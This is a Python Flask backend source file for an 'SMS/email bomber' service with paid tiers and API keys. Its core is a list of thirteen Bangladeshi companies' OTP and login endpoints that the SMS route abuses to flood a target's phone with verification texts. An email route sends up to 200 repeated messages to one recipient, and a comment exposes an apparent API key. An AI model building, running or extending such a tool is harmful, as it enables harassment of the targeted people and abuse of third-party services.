"""
Flask API Server — BomberSystem Backend
Deploy on Render.com (web service, gunicorn)
"""

import os
import re
import time
import uuid
import string
import random
import requests
from flask import Flask, request, jsonify

app = Flask(__name__)

# ─────────────────────────────────────────
# ENV
# ─────────────────────────────────────────
BACKEND_SECRET    = os.environ["BACKEND_SECRET"]
FIREBASE_URL      = os.environ["FIREBASE_URL"].rstrip("/")
CLOUDNEST_API_KEY = os.environ["CLOUDNEST_API_KEY"]   # cn_46df41f9832b438da28404d04c878367
CLOUDNEST_BASE    = "https://cloudnest.pythonanywhere.com"

# ─────────────────────────────────────────
# FIREBASE
# ─────────────────────────────────────────
def fb(path): return f"{FIREBASE_URL}/{path}.json"

def fb_get(path):
    try:
        r = requests.get(fb(path), timeout=10)
        return r.json() if r.status_code == 200 else None
    except: return None

def fb_set(path, data):
    try: requests.put(fb(path), json=data, timeout=10)
    except: pass

# ─────────────────────────────────────────
# AUTH GUARD
# ─────────────────────────────────────────
def check_secret(data: dict):
    return data.get("_secret") == BACKEND_SECRET

def check_api_key(key: str):
    """
    Validate an api_key from an external API call.
    Returns (user_data, chat_id) or (None, None).
    """
    users = fb_get("users") or {}
    for cid, u in users.items():
        if u.get("api_key") == key:
            return u, cid
    return None, None

def err(msg, code=400): return jsonify({"ok": False, "error": msg}), code
def ok(**kw): return jsonify({"ok": True, **kw})

# ─────────────────────────────────────────
# CLOUDNEST HELPERS
# ─────────────────────────────────────────
def cn_send_otp(email: str):
    r = requests.post(
        f"{CLOUDNEST_BASE}/api/otp/send",
        json={"api_key": CLOUDNEST_API_KEY, "email": email},
        timeout=15
    )
    return r.json() if r.status_code == 200 else {"ok": False, "error": r.text}

def cn_verify_otp(email: str, otp: str):
    r = requests.post(
        f"{CLOUDNEST_BASE}/api/otp/verify",
        json={"api_key": CLOUDNEST_API_KEY, "email": email, "otp": otp},
        timeout=15
    )
    return r.json() if r.status_code == 200 else {"ok": False, "error": r.text}

# ─────────────────────────────────────────
# TEMP MAIL HELPERS  (mail.tm / mail.gw)
# ─────────────────────────────────────────
MAIL_APIS = [
    {"name": "mail.tm", "base": "https://api.mail.tm"},
    {"name": "mail.gw", "base": "https://api.mail.gw"},
]

def _gwtm_create(base: str, custom: str | None = None):
    """Create a mail.tm / mail.gw account. Returns {email, token} or None."""
    try:
        r = requests.get(f"{base}/domains", timeout=10)
        if r.status_code != 200: return None
        domains = r.json().get("hydra:member", [])
        if not domains: return None
        domain = domains[0]["domain"]

        local = custom if custom else (
            ''.join(random.choices(string.ascii_lowercase + string.digits, k=12))
        )
        addr  = f"{local}@{domain}"
        pwd   = ''.join(random.choices(string.ascii_letters + string.digits, k=14))

        r2 = requests.post(f"{base}/accounts",
            json={"address": addr, "password": pwd},
            headers={"Content-Type": "application/json"},
            timeout=10)
        if r2.status_code not in (200, 201): return None

        r3 = requests.post(f"{base}/token",
            json={"address": addr, "password": pwd},
            headers={"Content-Type": "application/json"},
            timeout=10)
        if r3.status_code != 200: return None

        token = r3.json().get("token")
        if not token: return None
        return {"email": addr, "token": token, "base": base}
    except:
        return None

def create_temp_mail(custom: str | None = None):
    for api in MAIL_APIS:
        result = _gwtm_create(api["base"], custom)
        if result:
            return result
    return None

def fetch_inbox(token: str, base: str):
    """Fetch messages from mail.tm/gw inbox. Returns list of message dicts."""
    hdrs = {"Authorization": f"Bearer {token}", "Accept": "application/json"}
    try:
        r = requests.get(f"{base}/messages", headers=hdrs, timeout=15)
        if r.status_code != 200: return []
        raw = r.json()
        if isinstance(raw, dict):
            msgs_meta = raw.get("hydra:member", raw.get("messages", []))
        else:
            msgs_meta = raw

        out = []
        for m in msgs_meta[:5]:
            if not isinstance(m, dict): continue
            mid  = m.get("id") or m.get("@id", "")
            subj = m.get("subject", "")
            frm  = m.get("from", {})
            frm_addr = frm.get("address", str(frm)) if isinstance(frm, dict) else str(frm)
            ts   = m.get("createdAt", "")

            # Fetch full body
            body = ""
            try:
                r2 = requests.get(f"{base}/messages/{mid}", headers=hdrs, timeout=10)
                if r2.status_code == 200:
                    body = r2.json().get("text", "") or r2.json().get("html", "")
            except: pass

            out.append({
                "id":      str(mid),
                "from":    frm_addr,
                "subject": subj,
                "body":    body,
                "time":    ts,
            })
        return out
    except:
        return []

# ─────────────────────────────────────────
# ROUTES — AUTH (called by bot internally)
# ─────────────────────────────────────────
@app.route("/auth/send_otp", methods=["POST"])
def route_send_otp():
    data = request.json or {}
    if not check_secret(data): return err("Unauthorized", 401)
    email = data.get("email", "")
    if not email: return err("email required")
    res = cn_send_otp(email)
    if res.get("ok") or res.get("message"):
        return ok(message="OTP sent")
    return err(res.get("error", "CloudNest error"))

@app.route("/auth/verify_otp", methods=["POST"])
def route_verify_otp():
    data = request.json or {}
    if not check_secret(data): return err("Unauthorized", 401)
    email = data.get("email", "")
    otp   = data.get("otp", "")
    if not email or not otp: return err("email and otp required")
    res = cn_verify_otp(email, otp)
    if res.get("ok") or res.get("verified") or res.get("message"):
        return ok()
    return err(res.get("error", "OTP invalid or expired"))

# ─────────────────────────────────────────
# ROUTES — MAIL (called by bot + external devs)
# ─────────────────────────────────────────
@app.route("/mail/create", methods=["POST"])
def route_mail_create():
    data = request.json or {}

    # accept both internal (secret) and external (api_key) callers
    if data.get("_secret") and not check_secret(data):
        return err("Unauthorized", 401)
    if data.get("api_key"):
        u, cid = check_api_key(data["api_key"])
        if not u: return err("Invalid API key", 401)

    custom = data.get("custom")
    if custom:
        custom = re.sub(r'[^a-z0-9]', '', custom.lower())[:20]

    result = create_temp_mail(custom)
    if not result:
        return err("All mail providers failed — try again.")

    return ok(email=result["email"], token=result["token"], base=result["base"])

@app.route("/mail/inbox", methods=["POST"])
def route_mail_inbox():
    data = request.json or {}

    if data.get("api_key"):
        u, cid = check_api_key(data["api_key"])
        if not u: return err("Invalid API key", 401)
    elif not (data.get("_secret") and check_secret(data)):
        return err("Unauthorized", 401)

    token = data.get("token", "")
    base  = data.get("base", "https://api.mail.tm")
    if not token: return err("token required")

    msgs = fetch_inbox(token, base)
    return ok(messages=msgs)

# ─────────────────────────────────────────
# ROUTES — SMS  (external API)
# ─────────────────────────────────────────
@app.route("/sms/send", methods=["POST"])
def route_sms_send():
    data = request.json or {}
    api_key = data.get("api_key", "")
    number  = data.get("number", "").strip()

    if not api_key or not number:
        return err("api_key and number required")

    u, cid = check_api_key(api_key)
    if not u: return err("Invalid API key", 401)

    # daily limit check
    from datetime import date
    today = str(date.today())
    if u.get("last_reset") != today:
        u["sms_today"]  = 0
        u["last_reset"] = today

    free_lim  = int(os.environ.get("FREE_SMS_DAILY", "50"))
    premium   = u.get("premium", False) or (int(cid) in [
        int(x) for x in os.environ.get("ADMIN_IDS","").split(",") if x.strip()
    ])

    if not premium and u.get("sms_today", 0) >= free_lim:
        contact = os.environ.get("CONTACT_TG", "@admin")
        return err(f"Daily free limit ({free_lim}) reached. Contact {contact} for unlimited.", 429)

    # run one API call
    apis = _get_sms_apis(number)
    for api in apis:
        try:
            hdrs = {"User-Agent":"Mozilla/5.0","Accept":"application/json"}
            if api["method"] == "POST":
                r = requests.post(api["url"],
                    json=api.get("json"), data=api.get("data"),
                    headers=hdrs, timeout=8)
            else:
                r = requests.get(api["url"], headers=hdrs, timeout=8)
            if r.status_code in (200,201,202):
                u["sms_today"] = u.get("sms_today", 0) + 1
                u["total_sms"] = u.get("total_sms", 0) + 1
                fb_set(f"users/{cid}", u)
                return ok(source=api["name"], status=r.status_code)
        except: continue

    return err("All SMS providers failed.")

# ─────────────────────────────────────────
# ROUTES — EMAIL (external API)
# ─────────────────────────────────────────
@app.route("/email/send", methods=["POST"])
def route_email_send():
    import smtplib
    data = request.json or {}
    api_key = data.get("api_key","")
    if not api_key: return err("api_key required")

    u, cid = check_api_key(api_key)
    if not u: return err("Invalid API key", 401)

    to         = data.get("to","")
    subject    = data.get("subject","")
    body       = data.get("body","")
    count      = max(1, min(int(data.get("count", 1)), int(os.environ.get("FREE_EMAIL_DAILY","200"))))
    from_email = data.get("from_email") or os.environ.get("FREE_SENDER_EMAIL","")
    from_pass  = data.get("from_pass")  or os.environ.get("FREE_SENDER_PASS","")

    if not all([to, subject, body, from_email, from_pass]):
        return err("to, subject, body, from_email, from_pass all required")

    # daily limit
    from datetime import date
    today = str(date.today())
    if u.get("last_reset") != today:
        u["email_today"] = 0
        u["last_reset"]  = today

    free_lim = int(os.environ.get("FREE_EMAIL_DAILY","200"))
    premium  = u.get("premium", False)
    if not premium and (u.get("email_today",0) + count) > free_lim:
        return err(f"Daily free email limit ({free_lim}) reached.", 429)

    sent = 0
    try:
        srv = smtplib.SMTP("smtp.gmail.com", 587)
        srv.ehlo(); srv.starttls()
        srv.login(from_email, from_pass)
        for _ in range(count):
            srv.sendmail(from_email, to,
                f"From: {from_email}\nTo: {to}\nSubject: {subject}\n\n{body}")
            sent += 1
        srv.quit()
    except Exception as e:
        return err(str(e))

    u["email_today"] = u.get("email_today",0) + sent
    u["total_email"] = u.get("total_email",0) + sent
    fb_set(f"users/{cid}", u)
    return ok(sent=sent)

# ─────────────────────────────────────────
# SMS API LIST
# ─────────────────────────────────────────
def _get_sms_apis(number):
    raw = re.sub(r'\D','',number)
    if raw.startswith('880'):   raw = raw[3:]
    elif raw.startswith('88'):  raw = raw[2:]
    elif raw.startswith('0'):   raw = raw[1:]
    n0=f"0{raw}"; n88=f"88{n0}"; np88=f"+88{n0}"
    return [
        {"name":"Bioscope","method":"POST","url":"https://api-dynamic.bioscopelive.com/v2/auth/login?country=BD&platform=web&language=en","json":{"number":np88}},
        {"name":"BTCL","method":"POST","url":"https://mybtcl.btcl.gov.bd/api/ecare/anonym/sendOTP.json","json":{"phoneNbr":n0,"email":"","OTPType":1,"userName":""}},
        {"name":"BD Tickets","method":"POST","url":"https://api.bdtickets.com:20100/v1/auth","json":{"createUserCheck":True,"phoneNumber":np88,"applicationChannel":"WEB_APP"}},
        {"name":"Apex4U","method":"POST","url":"https://api.apex4u.com/api/auth/login","json":{"phoneNumber":n0}},
        {"name":"Swap BD","method":"POST","url":"https://api.swap.com.bd/api/v1/send-otp/v2","json":{"phone":n0}},
        {"name":"Arogga","method":"POST","url":"https://api.arogga.com/auth/v1/sms/send/?f=web&b=Chrome","data":{"mobile":n0,"fcmToken":"","referral":""}},
        {"name":"Fundesh","method":"POST","url":"https://fundesh.com.bd/api/auth/generateOTP?service_key=","json":{"msisdn":n0}},
        {"name":"Garibook","method":"POST","url":"https://api.garibookadmin.com/api/v3/user/login","json":{"mobile":n0,"recaptcha_token":"garibookcaptcha","channel":"web"}},
        {"name":"AppLink","method":"POST","url":"https://apps.applink.com.bd/appstore-v4-server/login/otp/request","json":{"msisdn":n88}},
        {"name":"Bikroy","method":"GET","url":f"https://bikroy.com/data/phone_number_login/verifications/phone_login?phone={n0}"},
        {"name":"Ghoori Learn","method":"POST","url":"https://api.ghoorilearning.com/api/auth/signup/otp?_app_platform=web","json":{"mobile_no":n0}},
        {"name":"Deepto Play","method":"POST","url":"https://api.deeptoplay.com/v2/auth/login?country=BD&platform=web&language=en","json":{"number":np88}},
        {"name":"GP Web","method":"POST","url":"https://webloginda.grameenphone.com/backend/api/v1/otp","data":{"msisdn":n0}},
    ]

# ─────────────────────────────────────────
# HEALTH
# ─────────────────────────────────────────
@app.route("/", methods=["GET"])
def health(): return ok(service="BomberAPI", status="running")

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 8000)), debug=False)
